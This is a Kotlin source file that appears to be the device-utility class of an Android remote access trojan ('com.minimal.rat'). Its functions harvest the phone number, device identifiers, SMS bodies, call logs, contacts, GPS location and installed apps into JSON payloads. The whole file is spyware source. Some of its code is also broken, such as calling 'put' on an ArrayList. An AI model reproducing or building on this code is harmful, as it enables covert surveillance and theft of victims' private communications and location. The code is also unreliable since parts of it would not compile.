package com.minimal.rat.util

import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Base64
import android.annotation.SuppressLint
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class DeviceUtils private constructor() {
    companion object {
        private var context: Context? = null
        private var locationManager: LocationManager? = null
        private var locationListener: LocationListener? = null

        fun init(appContext: Context) {
            context = appContext.applicationContext
        }

        private val ctx: Context
            get() = context ?: throw IllegalStateException("DeviceUtils not initialized")

        @SuppressLint("HardwareIds")
        fun collectDeviceInfo(context: Context): JSONObject {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val info = JSONObject()

            try {
                info.put("device_id", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
                info.put("model", Build.MODEL)
                info.put("brand", Build.BRAND)
                info.put("manufacturer", Build.MANUFACTURER)
                info.put("android_version", Build.VERSION.RELEASE)
                info.put("sdk_int", Build.VERSION.SDK_INT)
                info.put("fingerprint", Build.FINGERPRINT)

                info.put("phone_number", tm.line1Number)
                info.put("network_operator", tm.networkOperator)
                info.put("sim_state", tm.simState)
                info.put("is_rooted", isDeviceRooted())

                val activeNetwork = cm.activeNetwork
                val caps = activeNetwork?.let { cm.getNetworkCapabilities(it) }
                info.put("network_type", when {
                    caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WIFI"
                    caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "CELLULAR"
                    caps?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "ETHERNET"
                    caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true -> "VPN"
                    else -> "UNKNOWN"
                })

                val batIntent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                if (batIntent != null) {
                    val level = batIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                    val scale = batIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                    info.put("battery_pct", if (scale > 0) level * 100 / scale else -1)
                }

                info.put("timestamp", System.currentTimeMillis())
            } catch (e: Exception) {
                e.printStackTrace()
            }
            return info
        }

        fun getSmsData(context: Context, limit: Int = 50): JSONObject {
            val uri = android.net.Uri.parse("content://sms")
            val projection = arrayOf("_id", "address", "body", "date", "type", "read")
            val cursor = context.contentResolver.query(uri, projection, null, null, "date DESC LIMIT $limit")
            val arr = JSONObject()
            val list = java.util.ArrayList<JSONObject>()
            cursor?.use { c ->
                while (c.moveToNext()) {
                    list.put(JSONObject().apply {
                        put("id", c.getLong(0))
                        put("address", c.getString(1))
                        put("body", c.getString(2))
                        put("date", c.getLong(3))
                        put("type", when (c.getInt(4)) { 1 -> "INBOX"; 2 -> "SENT"; else -> "OTHER" })
                        put("read", c.getInt(5) == 1)
                    })
                }
            }
            arr.put("sms", list)
            return arr
        }

        fun getCallLogData(context: Context, limit: Int = 50): JSONObject {
            val uri = CallLog.Calls.CONTENT_URI
            val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION)
            val cursor = context.contentResolver.query(uri, projection, null, null, "${CallLog.Calls.DATE} DESC LIMIT $limit")
            val arr = JSONObject()
            val list = java.util.ArrayList<JSONObject>()
            cursor?.use { c ->
                while (c.moveToNext()) {
                    list.put(JSONObject().apply {
                        put("id", c.getLong(0))
                        put("number", c.getString(1))
                        put("type", when (c.getInt(2)) { CallLog.Calls.INCOMING_TYPE -> "INCOMING"; CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"; CallLog.Calls.MISSED_TYPE -> "MISSED"; else -> "OTHER" })
                        put("date", c.getLong(3))
                        put("duration", c.getLong(4))
                    })
                }
            }
            arr.put("calls", list)
            return arr
        }

        fun getContactsData(context: Context, limit: Int = 100): JSONObject {
            val uri = ContactsContract.Contacts.CONTENT_URI
            val projection = arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.Contacts.HAS_PHONE_NUMBER)
            val cursor = context.contentResolver.query(uri, projection, null, null, "${ContactsContract.Contacts.DISPLAY_NAME} ASC LIMIT $limit")
            val arr = JSONObject()
            val list = java.util.ArrayList<JSONObject>()
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val id = c.getLong(0)
                    list.put(JSONObject().apply {
                        put("id", id)
                        put("name", c.getString(1))
                        put("has_phone", c.getInt(2) > 0)
                    })
                }
            }
            arr.put("contacts", list)
            return arr
        }

        fun getLastKnownLocation(context: Context): JSONObject? {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var best: Location? = null
            var bestAcc = Float.MAX_VALUE
            for (provider in lm.getProviders(true)) {
                if (androidx.core.app.ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                    androidx.core.app.ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    val loc = lm.getLastKnownLocation(provider)
                    if (loc != null && loc.accuracy < bestAcc) {
                        bestAcc = loc.accuracy
                        best = loc
                    }
                }
            }
            return best?.let { loc ->
                JSONObject().apply {
                    put("lat", loc.latitude)
                    put("lon", loc.longitude)
                    put("acc", loc.accuracy)
                    put("time", loc.time)
                }
            }
        }

        fun getInstalledApps(context: Context): JSONObject {
            val pm = context.packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            val arr = JSONObject()
            val list = java.util.ArrayList<JSONObject>()
            for (app in apps) {
                val isSystem = (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                if (!isSystem) {
                    list.put(JSONObject().apply {
                        put("package", app.packageName)
                        put("name", pm.getApplicationLabel(app).toString())
                    })
                }
            }
            arr.put("apps", list)
            return arr
        }

        fun getBatteryInfo(context: Context): JSONObject {
            val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            return if (intent != null) {
                val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                JSONObject().apply {
                    put("level", level)
                    put("scale", scale)
                    put("pct", if (scale > 0) level * 100 / scale else -1)
                    put("status", when (status) {
                        BatteryManager.BATTERY_STATUS_CHARGING -> "CHARGING"
                        BatteryManager.BATTERY_STATUS_DISCHARGING -> "DISCHARGING"
                        BatteryManager.BATTERY_STATUS_FULL -> "FULL"
                        else -> "UNKNOWN"
                    })
                }
            } else JSONObject()
        }

        fun isDeviceRooted(): Boolean {
            val paths = arrayOf("/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su")
            return paths.any { File(it).exists() }
        }
    }
}